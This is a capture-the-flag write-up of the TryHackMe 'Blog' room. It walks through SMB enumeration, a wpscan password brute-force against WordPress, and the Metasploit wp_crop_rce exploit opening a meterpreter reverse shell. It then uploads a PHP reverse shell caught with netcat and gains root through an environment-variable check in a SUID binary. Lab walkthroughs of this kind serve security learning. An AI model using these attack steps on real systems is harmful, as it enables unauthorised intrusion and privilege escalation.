# Tryhackme blog room

*Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!*

*Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...*

*In order to get the blog to work with AWS, you'll need to add blog.thm to your /etc/hosts file.*

*Credit to [Sq00ky](https://tryhackme.com/p/Sq00ky) for the root privesc idea ;)*

we start first by adding the ip address of the room to our ‘/etc/hosts’ file so the site works just fine.

```bash
nano /etc/hosts
GNU nano 7.2                              /etc/hosts                                        
127.0.0.1       localhost
127.0.1.1       localhost
10.10.220.136   blog.thm
```

let’s enumerate our target

```bash
sudo nmap -Pn -sVC blog.thm  -min-rate=1000 -T4 -oN nmap-scan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-29 18:01 EDT
Nmap scan report for 10.10.138.1
Host is up (0.18s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  p�$HyU      Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-09-29T22:02:06
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2023-09-29T22:02:07+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.11 seconds

```

since we have an smb service running on our target, we use enum4linux to see whats’up with the smb service

```bash
enum4linux blog.thm
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ )
==================================( Share Enumeration on blog.thm )==================================                                                                                   
                                                                                              
                                                                                              
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            BLOG

[+] Attempting to map shares on 10.10.138.1                                                   
                                                                                              
//blog.thm/print$    Mapping: DENIED Listing: N/A Writing: N/A                             
//1blog.thm/BillySMB  Mapping: OK Listing: OK Writing: N/A

[E] Can't understand response:                                                                
                                                                                              
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                    
//10.10.138.1/IPC$      Mapping: N/A Listing: N/A Writing: N/A
```

now we have a share called “BillySMB’ that we can map and list!

let’s check the ‘BillySMB’ share

```bash
$ >.. smbclient //blog.thm/BillySMB
Password for [WORKGROUP\l33]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020

                15413192 blocks of size 1024. 9790376 blocks available
```

let’s try to download each of the files and check their content

```bash
smb: \> get Alice-White-Rabbit.jpg
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (24.4 KiloBytes/sec) (average 24.4 KiloBytes/sec)
smb: \> get tswift.mp4
getting file \tswift.mp4 of size 1236733 as tswift.mp4 (96.9 KiloBytes/sec) (average 89.9 KiloBytes/sec)
smb: \> get check-this.png
getting file \check-this.png of size 3082 as check-this.png (96.9 KiloBytes/sec) (average 89.9 KiloBytes/sec)
```

Hmm, let's download these files and analyse them

First one, Alice-White-Rabbit.jpg: It's a jpeg file, we can use steghide:

```bash
$ >.. steghide --extract -sf Alice-White-Rabbit.jpg
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".
```

we got a file from ‘Alice-White-Rabbit.jpg’ after using steghide to extarct hidden file

now let’s read the file, but omo which kind file go get this kind name

```bash
$ >.. cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend
```

not so good we just got ourselves into a rabbit hole

The other two files are a (funny) mp4 music clip, and a QR code, that leads to an youtube music clip (good music though! Long Live the 80's!). No hints there.

So, this whole SMB thing was a rabbit hole. Let's check other places!

Since port 80 is also open let’s see what we have there

from our nmap scan we can see that a directory called “robots.txt” exist

```bash
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

we try to access ‘blog.thm:80’

![Screenshot from 2023-09-29 22-39-52.png](tryhackme-blog/Screenshot_from_2023-09-29_22-42-57.png)

we visit ‘blog.thm/robots.txt’

![Screenshot from 2023-09-29 21-01-34.png](tryhackme-blog/Screenshot_from_2023-09-29_21-01-34.png)

Now if we try to access ‘blog.thm/wp-admin’ we get an WordPress login screen!

![Screenshot from 2023-09-29 21-08-26.png](tryhackme-blog/Screenshot_from_2023-09-29_21-08-26.png)

we use ‘wpscan’ to enumerate all users available on the WordPress

```bash
$ >.. wpscan --url blog.thm -e 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
[+] URL: blog.thm [10.10.255.89]

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: blog.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: blog.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: blog.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: blog.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: blog.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.255.89/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.255.89/, Match: 'WordPress 5.0'

[i] The main theme could not be detected.

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:29 <==============> (570 / 570) 100.00% Time: 00:00:29

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:01:12 <              > (140 / 2568)  5.45%  ETA: 00:20:50
^[ Checking Known Locations - Time: 00:02:12 <              > (152 / 2568)  5.91%  ETA: 00:35:^[ Checking Known Locations - Time: 00:02:12 <              > (153 / 2568)  5.95%  ETA: 00:34:^[ Checking Known Locations - Time: 00:02:12 <              > (158 / 2568)  6.15%  ETA: 00:33: Checking Known Locations - Time: 00:04:08 <==========   > (2065 / 2568) 80.41%  ETA: 00:01:00
 Checking Known Locations - Time: 00:06:40 <============> (2568 / 2568) 100.00% Time: 00:06:40

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:08 <===============> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:04 <=====================> (71 / 71) 100.00% Time: 00:00:04

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:05 <==========> (100 / 100) 100.00% Time: 00:00:05

[i] Medias(s) Identified:

[+] http://10.10.255.89/?attachment_id=14
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://10.10.255.89/?attachment_id=16
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://10.10.255.89/?attachment_id=22
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://10.10.255.89/?attachment_id=34
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.255.89/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.255.89/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Sep 29 22:06:33 2023
[+] Requests Done: 3503
[+] Cached Requests: 8
[+] Data Sent: 944.505 KB
[+] Data Received: 1.407 MB
[+] Memory used: 274.215 MB
[+] Elapsed time: 00:07:52
```

we use these users to gerenate a wordlist and use wpscan to brute-force

```bash
$ >.. nano user.txt
GNU nano 7.2                               users.txt                                        
bjoel
kwheel
karen wheeler
karen
wheeler
billy joel
billy
joel
```

```bash
$ >.. wpscan --url http://10.10.255.89 -U users.txt -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]n
Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.255.89/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.255.89/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.255.89/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.255.89/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.255.89/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.255.89/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.255.89/, Match: 'WordPress 5.0'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:08 <===============> (137 / 137) 100.00% Time: 00:00:08

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 8 user/s
[SUCCESS] - kwheel / c*******1
Trying bjoel / 666666 Time: 00:01:02 <=====================> (114755136/ 114755136)  99.99%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: kwheel, Password: c*******1
[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

```

we now know the username and password for the wordpress. the next step is to login in to the account with the gained credentials.

![Screenshot from 2023-09-29 22-39-05.png](Tryhackme%20blog%20room%2095a2025ae92d4b6a87d6e969275448d7/Screenshot_from_2023-09-29_22-39-05.png)

we now have acess as kwheel in the wordpress

![Screenshot from 2023-09-29 22-42-57.png](Tryhackme%20blog%20room%2095a2025ae92d4b6a87d6e969275448d7/Screenshot_from_2023-09-29_22-42-57.png)

hmmmmm what’s next?? since there’s no where we can plant a reverse shell from this dashboad we should search for exploit

using [https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/) i can see what framework and version that is running on the website.

![Screenshot (72).png](Tryhackme%20blog%20room%2095a2025ae92d4b6a87d6e969275448d7/Screenshot_(72).png)

we can see that the website is running wordpress 5.0, now lets search is there is any exploit for wordpress 5.0

```bash
$ >.. searchsploit wordpress 5.0  
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path
------------------------------------------------------------ ---------------------------------
NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi     | php/webapps/51042.txt
WordPress 5.0.0 - Image Remote Code Execution               | php/webapps/49512.py
WordPress Core 5.0 - Remote Code Execution                  | php/webapps/46511.js
WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit) | php/remote/46662.rb
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/P | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service     | php/dos/47800.py
WordPress Plugin Custom Pages 0.5.0.1 - Local File Inclusio | php/webapps/17119.txt
WordPress Plugin Database Backup < 5.2 - Remote Code Execut | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnera | php/webapps/39553.txt
WordPress Plugin FeedWordPress 2015.0426 - SQL Injection    | php/webapps/37067.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection   | php/webapps/44943.txt
WordPress Plugin leenk.me 2.5.0 - Cross-Site Request Forger | php/webapps/39704.txt
WordPress Plugin Marketplace Plugin 1.5.0 < 1.6.1 - Arbitra | php/webapps/18988.php
WordPress Plugin Network Publisher 5.0.1 - 'networkpub_key' | php/webapps/37174.txt
WordPress Plugin Nmedia WordPress Member Conversation 1.35. | php/webapps/37353.php
WordPress Plugin Quick Page/Post Redirect 5.0.3 - Multiple  | php/webapps/32867.txt
WordPress Plugin RegistrationMagic V 5.0.1.5 - SQL Injectio | php/webapps/50686.py
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection | php/webapps/48918.sh
WordPress Plugin Smart Slider-3 3.5.0.8 - 'name' Stored Cro | php/webapps/49958.txt
WordPress Plugin WP-Property 1.35.0 - Arbitrary File Upload | php/webapps/18987.php
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

from our result we can see that there is a metasplot exploit for wordpress 5.0. Let’s try and wee what we get from there

```bash
$ >.. msfconsole 
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.3.25-dev                          ]
+ -- --=[ 2332 exploits - 1219 auxiliary - 413 post       ]
+ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d
Metasploit Documentation: https://docs.metasploit.com/
msf6 > search wordpress 5.0

Matching Modules
================

   #  Name                                                     Disclosure Date  Rank       Check  Description
   -  ----                                                     ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce                           2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   1  exploit/unix/webapp/wp_property_upload_exec              2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
   2  auxiliary/scanner/http/wp_woocommerce_payments_add_user  2023-03-22       normal     Yes    Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation
   3  auxiliary/scanner/http/wp_registrationmagic_sqli         2022-01-23       normal     Yes    Wordpress RegistrationMagic task_ids Authenticated SQLi

Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/http/wp_registrationmagic_sqli
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_crop_rce) > show options
Module options (exploit/multi/http/wp_crop_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       The WordPress password to authenticate with
   Proxies                     no        A proxy chain of format type:host:port[,type:host:p
                                         ort][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com
                                         /docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   THEME_DIR                   no        The WordPress theme dir name (disable theme auto-de
                                         tection if provided)
   USERNAME                    yes       The WordPress username to authenticate with
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.80.131   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   WordPress

View the full module info with the info, or info -d command.
```

we set RHOSTS, RPORT, LHOST, LPORT

```bash
msf6 exploit(multi/http/wp_crop_rce) > set rhosts 10.10.61.237
rhosts => 10.10.61.237
msf6 exploit(multi/http/wp_crop_rce) > set lhosts tun0
lhosts => 10.8.110.7
msf6 exploit(multi/http/wp_crop_rce) > set username kwheel
username => kwheel
msf6 exploit(multi/http/wp_crop_rce) > set password cutiepie1
password => c*******1

msf6 exploit(multi/http/wp_crop_rce) > run

[*] Started reverse TCP handler on tun0:4444 
[*] Authenticating with WordPress using kwheel:c*******1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to blog.thm
[*] Meterpreter session 1 opened (tun0:4444 -> blog.thm:37408) at 2023-09-30 05:03:51 -0400
[*] Attempting to clean up files...
meterpreter > ls
Listing: /var/www/wordpress
===========================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100640/rw-r-----  235    fil   2020-05-28 08:15:42 -0400  .htaccess
100640/rw-r-----  235    fil   2020-05-27 23:44:26 -0400  .htaccess_backup
100644/rw-r--r--  1111   fil   2023-09-30 05:07:23 -0400  bOLsoFaNEi.php
100644/rw-r--r--  1111   fil   2023-09-30 05:03:34 -0400  dsNXdrynvU.php
100640/rw-r-----  418    fil   2013-09-24 20:18:11 -0400  index.php
100640/rw-r-----  19935  fil   2020-05-26 11:39:37 -0400  license.txt
100640/rw-r-----  7415   fil   2020-05-26 11:39:37 -0400  readme.html
100640/rw-r-----  5458   fil   2020-05-26 11:39:37 -0400  wp-activate.php
040750/rwxr-x---  4096   dir   2018-12-06 13:00:07 -0500  wp-admin
100640/rw-r-----  364    fil   2015-12-19 06:20:28 -0500  wp-blog-header.php
100640/rw-r-----  1889   fil   2018-05-02 18:11:25 -0400  wp-comments-post.php
100640/rw-r-----  2853   fil   2015-12-16 04:58:26 -0500  wp-config-sample.php
100640/rw-r-----  3279   fil   2020-05-27 23:49:17 -0400  wp-config.php
040750/rwxr-x---  4096   dir   2020-05-25 23:52:32 -0400  wp-content
100640/rw-r-----  3669   fil   2017-08-20 00:37:45 -0400  wp-cron.php
040750/rwxr-x---  12288  dir   2018-12-06 13:00:08 -0500  wp-includes
100640/rw-r-----  2422   fil   2016-11-20 21:46:30 -0500  wp-links-opml.php
100640/rw-r-----  3306   fil   2017-08-22 07:52:48 -0400  wp-load.php
100640/rw-r-----  37286  fil   2020-05-26 11:39:37 -0400  wp-login.php
100640/rw-r-----  8048   fil   2017-01-11 00:13:43 -0500  wp-mail.php
100640/rw-r-----  17421  fil   2018-10-23 03:04:39 -0400  wp-settings.php
100640/rw-r-----  30091  fil   2018-04-29 19:10:26 -0400  wp-signup.php
100640/rw-r-----  4620   fil   2017-10-23 18:12:51 -0400  wp-trackback.php
100640/rw-r-----  3065   fil   2016-08-31 12:31:29 -0400  xmlrpc.php
```

let’s try to upload a reverse shell in the above directory 

[https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) —> link to php reverse shell

```bash
meterpreter > upload shell.php
[*] Uploading  : /home/l33/blog/shell.php -> shell.php
[*] Uploaded -1.00 B of 3.82 KiB (-0.03%): /home/l33/blog/shell.php -> shell.php
[*] Completed  : /home/l33/blog/shell.php -> shell.php
```

Now we try to access the reverse shell using netcat

```bash
$ >.. nc -nlvp 1337        
Listening on 0.0.0.0 1337
```

we try to access blog.thm/shell.php so the reverse shell ca be executed

![Screenshot from 2023-09-30 05-23-07.png](Tryhackme%20blog%20room%2095a2025ae92d4b6a87d6e969275448d7/Screenshot_from_2023-09-30_05-23-07.png)

Now we have gotten a shell! as www-data

```bash
$ >.. nc -nlvp 1337        
Listening on 0.0.0.0 1337
Connection received on 10.10.93.139 56842
Linux blog 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 09:21:49 up 26 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

it’s time for us to stabilize our shell

```bash
STEP 1****************************************:
pyhton3 -c 'import pty;pty.spawn ("/bin/bash")'

STEP 2:
Press CTRL + Z to background process and get back to your host machine

STEP 3:
stty raw -echo; fg

STEP 4:
export TERM=xterm****************************************
```

now that we have a stabilized shell our goals is to get root.txt and user.txt

we search for SUID files to escalate our privilege

```bash
www-data@blog:/$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
/snap/core/8268/bin/mount
/snap/core/8268/bin/ping
/snap/core/8268/bin/ping6
/snap/core/8268/bin/su
/snap/core/8268/bin/umount
/snap/core/8268/usr/bin/chfn
/snap/core/8268/usr/bin/chsh
/snap/core/8268/usr/bin/gpasswd
/snap/core/8268/usr/bin/newgrp
/snap/core/8268/usr/bin/passwd
/snap/core/8268/usr/bin/sudo
/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/8268/usr/lib/openssh/ssh-keysign
/snap/core/8268/usr/lib/snapd/snap-confine
/snap/core/8268/usr/sbin/pppd
/snap/core/9066/bin/mount
/snap/core/9066/bin/ping
/snap/core/9066/bin/ping6
/snap/core/9066/bin/su
/snap/core/9066/bin/umount
/snap/core/9066/usr/bin/chfn
/snap/core/9066/usr/bin/chsh
/snap/core/9066/usr/bin/gpasswd
/snap/core/9066/usr/bin/newgrp
/snap/core/9066/usr/bin/passwd
/snap/core/9066/usr/bin/sudo
/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core/9066/usr/lib/openssh/ssh-keysign
/snap/core/9066/usr/lib/snapd/snap-confine
/snap/core/9066/usr/sbin/pppd
```

We have some common files, BUT there is an interesting one... `/usr/sbin/checker`.  let’s check it out

```bash
www-data@blog:/$ ls -la /usr/sbin/checker
-rwsr-sr-x 1 root root 8432 May 26  2020 /usr/sbin/checker
```

So it is a root owned binary, with SUID flag on. What happens when we run it?

```bash
www-data@blog:/$ /usr/sbin/checker
Not an Admin
```

To reverse-engineer this we will use a command called **ltrace.**

```bash
www-data@blog:/$ ltrace /usr/sbin/checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```

so what ‘/usr/bin/checker’  is doing is calling a getenv() on "admin” variable and returning its value. so if we set this environment variable, what happens?

```bash
www-data@blog:/$ export admin=hello!
```

since we have set a value to the admin variable, lets re-run ‘/usr/sbin/checker’ to see what would happen

```bash
www-data@blog:/$ /usr/sbin/checker
root@blog:/#
```

wow ! we just got a shell as root

Now back to our goal which is root.txt and user.txt

```bash
root@blog:/# cd /root
root@blog:/root# cat root.txt
9*******8be***fa******c********8
root@blog:/root#
```

Now to get user.txt

```bash
root@blog:/root# cd /home
root@blog:/home# ls
bjoel
root@blog:/home# cd bjoel
root@blog:/home/bjoel# ls
Billy_Joel_Termination_May20-2020.pdf  user.txt
root@blog:/home/bjoel# cat user.txt
You won't find what you're looking for here.

TRY HARDER
root@blog:/home/bjoel#
```

let’s secrch if there is another user.txt in the machine

```bash
root@blog:/home/bjoel# find / -type f -name user.txt 2>/dev/null
/home/bjoel/user.txt
/media/usb/user.txt
root@blog:/home/bjoel#
```

lets check the output of ‘/media/usb/user.txt’

```bash
root@blog:/home/bjoel# cat /media/usb/user.txt
c******************************7
```

yay!, it was there!!!

### Thank you for reading this write-up!

